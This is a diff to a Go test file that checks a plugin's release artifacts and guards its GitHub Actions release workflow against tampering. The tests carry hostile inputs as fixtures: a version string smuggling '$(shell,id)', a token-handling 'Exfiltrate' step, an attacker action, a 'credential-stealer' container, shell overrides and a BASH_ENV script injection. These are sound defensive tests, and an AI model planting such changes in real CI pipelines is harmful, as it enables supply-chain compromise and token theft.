@@ -19,14 +19,14 @@ func TestValidateVersion(t *testing.T) {
 		version string
 		wantErr bool
 	}{
-		{name: "release", tag: "v0.1.0", version: "0.1.0"},
-		{name: "prerelease", tag: "v0.1.0-rc.1", version: "0.1.0-rc.1"},
-		{name: "tag mismatch", tag: "v0.1.1", version: "0.1.0", wantErr: true},
-		{name: "missing tag prefix", tag: "0.1.0", version: "0.1.0", wantErr: true},
+		{name: "release", tag: "v0.2.0", version: "0.2.0"},
+		{name: "prerelease", tag: "v0.2.0-rc.1", version: "0.2.0-rc.1"},
+		{name: "tag mismatch", tag: "v0.1.1", version: "0.2.0", wantErr: true},
+		{name: "missing tag prefix", tag: "0.2.0", version: "0.2.0", wantErr: true},
 		{name: "leading zero", tag: "v0.01.0", version: "0.01.0", wantErr: true},
 		{name: "make expression", tag: "v$(shell,id)", version: "$(shell,id)", wantErr: true},
-		{name: "newline", tag: "v0.1.0\nnext", version: "0.1.0\nnext", wantErr: true},
-		{name: "slash", tag: "v0.1.0/path", version: "0.1.0/path", wantErr: true},
+		{name: "newline", tag: "v0.2.0\nnext", version: "0.2.0\nnext", wantErr: true},
+		{name: "slash", tag: "v0.2.0/path", version: "0.2.0/path", wantErr: true},
 	} {
 		test := test
 		t.Run(test.name, func(t *testing.T) {
@@ -42,8 +42,8 @@ func TestValidateVersion(t *testing.T) {
 func TestValidateRelease(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeReleaseFixture(t, root, "0.1.0")
-	if err := validateRelease(root, "dist", "v0.1.0", "0.1.0"); err != nil {
+	writeReleaseFixture(t, root, "0.2.0")
+	if err := validateRelease(root, "dist", "v0.2.0", "0.2.0"); err != nil {
 		t.Fatal(err)
 	}
 }
@@ -51,9 +51,9 @@ func TestValidateRelease(t *testing.T) {
 func TestValidateReleaseRejectsRegistryMismatch(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeReleaseFixture(t, root, "0.1.0")
+	writeReleaseFixture(t, root, "0.2.0")
 	writeRegistry(t, root, "0.1.1")
-	if err := validateRelease(root, "dist", "v0.1.0", "0.1.0"); err == nil || !strings.Contains(err.Error(), "registry version") {
+	if err := validateRelease(root, "dist", "v0.2.0", "0.2.0"); err == nil || !strings.Contains(err.Error(), "registry version") {
 		t.Fatalf("validateRelease() error = %v, want registry version error", err)
 	}
 }
@@ -61,14 +61,14 @@ func TestValidateReleaseRejectsRegistryMismatch(t *testing.T) {
 func TestValidateReleaseRejectsRegistryArchiveMismatch(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeReleaseFixture(t, root, "0.1.0")
+	writeReleaseFixture(t, root, "0.2.0")
 	writeRegistryValue(t, root, registryPlugin{
 		ID:      pluginID,
-		Version: "0.1.0",
+		Version: "0.2.0",
 		License: "MIT",
 		Release: registryRelease{Archive: pluginID + "_0.1.1_linux_amd64.zip", Checksums: "checksums.txt"},
 	})
-	if err := validateRelease(root, "dist", "v0.1.0", "0.1.0"); err == nil || !strings.Contains(err.Error(), "registry archive") {
+	if err := validateRelease(root, "dist", "v0.2.0", "0.2.0"); err == nil || !strings.Contains(err.Error(), "registry archive") {
 		t.Fatalf("validateRelease() error = %v, want registry archive error", err)
 	}
 }
@@ -76,10 +76,10 @@ func TestValidateReleaseRejectsRegistryArchiveMismatch(t *testing.T) {
 func TestValidateReleaseRequiresChecksumsForBothArtifacts(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeReleaseFixture(t, root, "0.1.0")
-	archive := filepath.Join(root, "dist", pluginID+"_0.1.0_linux_amd64.zip")
+	writeReleaseFixture(t, root, "0.2.0")
+	archive := filepath.Join(root, "dist", pluginID+"_0.2.0_linux_amd64.zip")
 	writeChecksums(t, filepath.Join(root, "dist", "checksums.txt"), []string{archive})
-	if err := validateRelease(root, "dist", "v0.1.0", "0.1.0"); err == nil || !strings.Contains(err.Error(), "want 2") {
+	if err := validateRelease(root, "dist", "v0.2.0", "0.2.0"); err == nil || !strings.Contains(err.Error(), "want 16") {
 		t.Fatalf("validateRelease() error = %v, want missing artifact checksum error", err)
 	}
 }
@@ -87,12 +87,12 @@ func TestValidateReleaseRequiresChecksumsForBothArtifacts(t *testing.T) {
 func TestValidateReleaseRejectsArchiveMismatch(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeReleaseFixture(t, root, "0.1.0")
-	archive := filepath.Join(root, "dist", pluginID+"_0.1.0_linux_amd64.zip")
+	writeReleaseFixture(t, root, "0.2.0")
+	archive := filepath.Join(root, "dist", pluginID+"_0.2.0_linux_amd64.zip")
 	writeArchive(t, archive, []byte("different"))
-	library := filepath.Join(root, "dist", pluginID+"-v0.1.0.so")
+	library := filepath.Join(root, "dist", pluginID+"-v0.2.0.so")
 	writeChecksums(t, filepath.Join(root, "dist", "checksums.txt"), []string{library, archive})
-	if err := validateRelease(root, "dist", "v0.1.0", "0.1.0"); err == nil || !strings.Contains(err.Error(), "does not match") {
+	if err := validateRelease(root, "dist", "v0.2.0", "0.2.0"); err == nil || !strings.Contains(err.Error(), "does not match") {
 		t.Fatalf("validateRelease() error = %v, want archive mismatch error", err)
 	}
 }
@@ -139,12 +139,12 @@ func TestValidateHostImagePinRejectsDigestDrift(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	writeDocumentation(t, root)
-	path := filepath.Join(root, ".github", "release-host-image.json")
+	path := filepath.Join(root, ".github", "host-images.json")
 	raw, err := os.ReadFile(path)
 	if err != nil {
 		t.Fatal(err)
 	}
-	raw = []byte(strings.Replace(string(raw), hostImageAMD64Digest, "sha256:"+strings.Repeat("0", 64), 1))
+	raw = []byte(strings.Replace(string(raw), baselineHostImageAMD64Digest, "sha256:"+strings.Repeat("0", 64), 1))
 	if err := os.WriteFile(path, raw, 0o644); err != nil {
 		t.Fatal(err)
 	}
@@ -202,8 +202,8 @@ func TestValidateWorkflowActionPinsRejectsUnpinnedYAMLWorkflow(t *testing.T) {
 func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishCommand(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	workflow := validReleaseWorkflow + "      - name: Exfiltrate\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: printf '%s' \"$GH_TOKEN\" >/dev/null\n"
-	writeWorkflow(t, root, "release.yml", workflow)
+	workflow := validReleaseWorkflow(t) + "      - name: Exfiltrate\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: printf '%s' \"$GH_TOKEN\" >/dev/null\n"
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want canonical publication rejection", err)
 	}
@@ -212,28 +212,58 @@ func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishCommand(t *testing.T)
 func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishAction(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n", "      - { uses: attacker/example@"+strings.Repeat("a", 40)+" }\n      - name: Publish GitHub release\n", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	workflow := strings.Replace(validReleaseWorkflow(t), "      - name: Publish GitHub release\n", "      - { uses: attacker/example@"+strings.Repeat("a", 40)+" }\n      - name: Publish GitHub release\n", 1)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "exactly") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want extra action rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsWorkflowDefaults(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "permissions:\n  contents: read", "defaults:\n  run:\n    shell: bash -c 'printf malicious-side-effect; bash {0}'\npermissions:\n  contents: read", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want workflow defaults rejection", err)
 	}
 }
 
 func TestValidateReleaseWorkflowBoundaryRejectsPublishDefaults(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    permissions:\n      contents: write", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	workflow := strings.Replace(validReleaseWorkflow(t), "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    permissions:\n      contents: write", 1)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish defaults rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildShell(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "    outputs:\n      version:", "    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    outputs:\n      version:", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want build defaults rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildStepShell(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "      - name: Package\n        working-directory:", "      - name: Package\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        working-directory:", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want build step shell rejection", err)
 	}
 }
 
 func TestValidateReleaseWorkflowBoundaryRejectsPublishContainer(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    container: attacker.invalid/credential-stealer:latest\n    permissions:\n      contents: write", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	workflow := strings.Replace(validReleaseWorkflow(t), "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    container: attacker.invalid/credential-stealer:latest\n    permissions:\n      contents: write", 1)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish container rejection", err)
 	}
@@ -242,8 +272,8 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublishContainer(t *testing.T) {
 func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n        env:", "      - name: Publish GitHub release\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        env:", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	workflow := strings.Replace(validReleaseWorkflow(t), "      - name: Publish GitHub release\n        env:", "      - name: Publish GitHub release\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        env:", 1)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publication shell rejection", err)
 	}
@@ -252,10 +282,66 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
 func TestValidateReleaseWorkflowBoundaryAcceptsCanonicalWorkflow(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeWorkflow(t, root, "release.yml", validReleaseWorkflow)
+	writeReleaseWorkflows(t, root, validReleaseWorkflow(t))
 	if err := validateReleaseWorkflowBoundary(root); err != nil {
 		t.Fatal(err)
 	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildCommandMutation(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "          make package VERSION=\"$VERSION\" OUT=\"$library\" ARCHIVE=\"$archive\"", "          make package VERSION=\"$VERSION\" OUT=\"$library\" ARCHIVE=\"$archive\"\n          printf injected >> \"$library\"", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical command") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want command mutation rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsBuildEnvironmentMutation(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "        env:\n          VERSION: ${{ steps.release.outputs.version }}\n          RAW_TAG: ${{ steps.target.outputs.tag }}\n        run: |\n          set -euo pipefail\n          library=", "        env:\n          VERSION: ${{ steps.release.outputs.version }}\n          RAW_TAG: ${{ steps.target.outputs.tag }}\n          BASH_ENV: ../release-controls/attacker.sh\n        run: |\n          set -euo pipefail\n          library=", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical environment") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want environment mutation rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsFoldedBuildCommand(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "        run: |\n          set -euo pipefail\n          sudo --preserve-env=VERSION,HOST_MATRIX_NAMESPACE make test-host-matrix", "        run: >-\n          set -euo pipefail\n          sudo --preserve-env=VERSION,HOST_MATRIX_NAMESPACE make test-host-matrix", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "literal block style") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want folded build command rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsChangedRunChomping(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "        run: |\n          set -euo pipefail\n          sudo --preserve-env=VERSION,HOST_MATRIX_NAMESPACE make test-host-matrix", "        run: |-\n          set -euo pipefail\n          sudo --preserve-env=VERSION,HOST_MATRIX_NAMESPACE make test-host-matrix", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "exactly run: |") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want changed chomping rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsFoldedPublicationCommand(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow(t), "        run: |\n          set -euo pipefail\n          actual_tag_object=", "        run: >-\n          set -euo pipefail\n          actual_tag_object=", 1)
+	writeReleaseWorkflows(t, root, workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "literal block style") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want folded publication command rejection", err)
+	}
+}
+
+func writeReleaseWorkflows(t *testing.T, root, release string) {
+	t.Helper()
+	writeWorkflow(t, root, "ci.yml", "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\n")
+	writeWorkflow(t, root, "release.yml", release)
 }
 
 func writeWorkflow(t *testing.T, root, name, contents string) {
@@ -269,37 +355,14 @@ func writeWorkflow(t *testing.T, root, name, contents string) {
 	}
 }
 
-const validReleaseWorkflow = `name: Release
-permissions:
-  contents: read
-jobs:
-  build:
-    runs-on: ubuntu-24.04
-    steps: []
-  publish:
-    needs: build
-    runs-on: ubuntu-24.04
-    permissions:
-      contents: write
-    steps:
-      - name: Download release artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
-        with:
-          name: release-artifacts
-          path: release-artifacts
-      - name: Publish GitHub release
-        env:
-          GH_TOKEN: ${{ github.token }}
-          GH_REPO: ${{ github.repository }}
-          VERSION: ${{ needs.build.outputs.version }}
-          RAW_TAG: ${{ github.ref_name }}
-        run: |
-          gh release create "$RAW_TAG" \
-            "release-artifacts/zai-coding-plan-v${VERSION}.so" \
-            "release-artifacts/zai-coding-plan_${VERSION}_linux_amd64.zip" \
-            release-artifacts/checksums.txt \
-            --verify-tag --generate-notes
-`
+func validReleaseWorkflow(t *testing.T) string {
+	t.Helper()
+	raw, err := os.ReadFile(filepath.Join("..", "..", "workflows", "release.yml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	return string(raw)
+}
 
 func writeReleaseFixture(t *testing.T, root, version string) {
 	t.Helper()
@@ -315,7 +378,58 @@ func writeReleaseFixture(t *testing.T, root, version string) {
 		t.Fatal(err)
 	}
 	writeArchive(t, archive, []byte("shared-library"))
-	writeChecksums(t, filepath.Join(dist, "checksums.txt"), []string{library, archive})
+	for name, mode := range operatorModes {
+		body := "fixture-" + name
+		if name == "registry.json" {
+			raw, err := os.ReadFile(filepath.Join(root, "registry.json"))
+			if err != nil {
+				t.Fatal(err)
+			}
+			body = string(raw)
+		}
+		if name == "release-sha.txt" {
+			body = strings.Repeat("a", 40) + "\n"
+		}
+		if err := os.WriteFile(filepath.Join(dist, name), []byte(body), mode); err != nil {
+			t.Fatal(err)
+		}
+	}
+	writeOperatorBundleFromDist(t, dist, version)
+	artifacts := []string{library, archive, filepath.Join(dist, pluginID+"-v"+version+"-operator.zip")}
+	for name := range operatorModes {
+		artifacts = append(artifacts, filepath.Join(dist, name))
+	}
+	writeChecksums(t, filepath.Join(dist, "checksums.txt"), artifacts)
+}
+
+func writeOperatorBundleFromDist(t *testing.T, dist, version string) {
+	t.Helper()
+	file, err := os.Create(filepath.Join(dist, pluginID+"-v"+version+"-operator.zip"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	writer := zip.NewWriter(file)
+	for name, mode := range operatorModes {
+		raw, err := os.ReadFile(filepath.Join(dist, name))
+		if err != nil {
+			t.Fatal(err)
+		}
+		header := &zip.FileHeader{Name: name, Method: zip.Deflate}
+		header.SetMode(mode)
+		entry, err := writer.CreateHeader(header)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := entry.Write(raw); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := writer.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := file.Close(); err != nil {
+		t.Fatal(err)
+	}
 }
 
 func writeDocumentation(t *testing.T, root string) {
@@ -323,18 +437,48 @@ func writeDocumentation(t *testing.T, root string) {
 	if err := os.MkdirAll(filepath.Join(root, ".github"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	pin := map[string]string{
-		"repository":      hostImageRepository,
-		"tag":             hostImageTag,
-		"platform":        "linux/amd64",
-		"manifest_digest": hostImageAMD64Digest,
+	matrix := map[string]any{
+		"repository": hostImageRepository,
+		"platform":   "linux/amd64",
+		"baseline": map[string]string{
+			"tag":             baselineHostImageTag,
+			"manifest_digest": baselineHostImageAMD64Digest,
+		},
 	}
-	pinRaw, err := json.Marshal(pin)
+	matrixRaw, err := json.Marshal(matrix)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(filepath.Join(root, ".github", "release-host-image.json"), pinRaw, 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(root, ".github", "host-images.json"), matrixRaw, 0o644); err != nil {
 		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(root, "deploy"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	deployed := map[string]string{
+		"repository":      hostImageRepository,
+		"tag":             "v7.2.151",
+		"platform":        "linux/amd64",
+		"manifest_digest": "sha256:" + strings.Repeat("1", 64),
+	}
+	deployedRaw, err := json.Marshal(deployed)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "deploy", "deployed-host-image.json"), deployedRaw, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	for _, path := range []string{
+		filepath.Join(root, ".github", "scripts", "resolve-host-images.sh"),
+		filepath.Join(root, ".github", "scripts", "run-host-matrix.sh"),
+		filepath.Join(root, ".github", "workflows", "host-compatibility.yml"),
+	} {
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, []byte("fixture"), 0o755); err != nil {
+			t.Fatal(err)
+		}
 	}
 	if err := os.WriteFile(filepath.Join(root, "LICENSE"), []byte(canonicalMITLicense), 0o644); err != nil {
 		t.Fatal(err)
@@ -342,7 +486,7 @@ func writeDocumentation(t *testing.T, root string) {
 	if err := os.WriteFile(filepath.Join(root, "NOTICE"), []byte(canonicalNotice), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	changelog := "## [0.1.0] - 2026-09-08\n\n[0.1.0]: https://github.com/TogetherWeOwn/cpa-plugin-zai-coding-plan/releases/tag/v0.1.0\n"
+	changelog := "## [0.2.0] - 2026-09-08\n\n[0.2.0]: https://github.com/TogetherWeOwn/cpa-plugin-zai-coding-plan/releases/tag/v0.2.0\n"
 	if err := os.WriteFile(filepath.Join(root, "CHANGELOG.md"), []byte(changelog), 0o644); err != nil {
 		t.Fatal(err)
 	}
